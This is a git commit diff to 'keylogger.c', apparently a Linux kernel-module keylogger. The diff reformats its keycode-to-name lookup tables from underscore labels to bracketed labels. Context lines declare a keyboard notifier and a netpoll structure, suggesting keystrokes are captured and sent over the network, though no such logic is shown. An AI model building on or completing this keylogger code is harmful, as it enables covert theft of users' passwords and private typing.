1971f2b81bde6510576768376db9b323996a0e0a
Reilly Moore <yllierm519@gmail.com>
2015-12-07 03:50:51 -0500

    Format keys better

--- keylogger.c
+++ keylogger.c
@@ -25,26 +25,26 @@ MODULE_LICENSE("GPL");
 //Based on this table
 //http://www.comptechdoc.org/os/linux/howlinuxworks/linux_hlkeycodes.html
 //Not really sure what these values are based on
-static const char* keys[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
-                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
-                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
-                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
-                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
-                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
-                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
-                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
-                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};
+static const char* keys[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BACKSPACE]", "[TAB]",
+                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "[ENTER]", "[CTRL]", "a", "s", "d", "f",
+                        "g", "h", "j", "k", "l", ";", "'", "`", "[SHIFT]", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
+                        "/", "[SHIFT]", "\0", "\0", " ", "[CAPSLOCK]", "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]",
+                        "[F8]", "[F9]", "[F10]", "[NUMLOCK]", "[SCROLLLOCK]", "[HOME]", "[UP]", "[PGUP]", "-", "[LEFT]", "5",
+                        "[RTARROW]", "+", "[END]", "[DOWN]", "[PGDN]", "[INS]", "[DEL]", "\0", "\0", "\0", "[F11]", "[F12]",
+                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "[ENTER]", "CTRL]", "/", "[PRTSCR]", "ALT", "\0", "[HOME]",
+                        "[UP]", "[PGUP]", "[LEFT]", "[RIGHT]", "[END]", "[DOWN]", "[PGDN]", "[INSERT]", "[DEL]", "\0", "\0",
+                        "\0", "\0", "\0", "\0", "\0", "[PAUSE]"};
 
 static const char* keysShift[] =
-                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
-                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
-                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
-                        "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
-                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
-                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
-                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
-                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
-                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};
+                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "]", "+", "[BACKSPACE]", "[TAB]",
+                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "[ENTER]", "[CTRL]", "A", "S", "D", "F",
+                        "G", "H", "J", "K", "L", ":", "\"", "~", "[SHIFT]", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
+                        "?", "[SHIFT]", "\0", "\0", " ", "[CAPSLOCK]", "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]",
+                        "[F8]", "[F9]", "[F10]", "[NUMLOCK]", "[SCROLLLOCK]", "[HOME]", "[UP]", "[PGUP]", "-", "[LEFT]", "5",
+                        "[RTARROW]", "+", "[END]", "[DOWN]", "[PGDN]", "[INS]", "[DEL]", "\0", "\0", "\0", "[F11]", "[F12]",
+                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "[ENTER]", "CTRL]", "/", "[PRTSCR]", "ALT", "\0", "[HOME]",
+                        "[UP]", "[PGUP]", "[LEFT]", "[RIGHT]", "[END]", "[DOWN]", "[PGDN]", "[INSERT]", "[DEL]", "\0", "\0",
+                        "\0", "\0", "\0", "\0", "\0", "[PAUSE]"};
 
 static struct notifier_block nb;
 static struct netpoll np;
